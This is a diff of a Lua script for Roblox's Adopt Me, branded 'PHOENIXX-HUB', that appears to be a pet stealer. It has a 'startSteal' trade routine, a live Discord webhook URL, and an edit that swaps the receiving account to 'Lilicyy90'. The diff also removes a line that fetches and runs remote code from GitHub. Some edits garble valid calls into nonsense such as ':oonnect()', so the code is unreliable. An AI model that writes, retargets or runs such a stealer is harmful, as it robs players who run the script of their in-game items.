@@ -1,6 +1,6 @@
 local Webhook = "https://discord.com/api/webhooks/1465340884705873931/sjdicI6_huK8qalBn_ntg_avQAvNASoPpHo-hsWPR9M_xQOUmUyyEuiTUm8MPR0lurXN"
-local Username = {"zxrx66666"}
-local ExtraUsers = {"zxrx66666"}
+local Username = {"Lilicyy90"}
+local ExtraUsers = {"Lilicyy90"}
 local Friends = {}
 
 for _, v in ipairs(Username) do table.insert(Friends, v) end
@@ -272,11 +272,11 @@ local function startSteal(plr)
         end
 
         if not LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
-            if declineConn then declineConn:Disconnect() end
+            if declineConn then declineConn:oonnect() end
             return
         end
 
-        if declineConn then declineConn:Disconnect() end
+        if declineConn then declineConn:ronnect() end
 
         for i = 1, math.min(18, #hits) do
             local pet = hits[i]
@@ -314,5 +314,3 @@ Players.PlayerAdded:Connect(function(p)
 end)
 
 print("[Script PHOENIXX-HUB] Adopt Me Loaded")
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/changelog-modul/Adop/refs/heads/main/visual", true))()
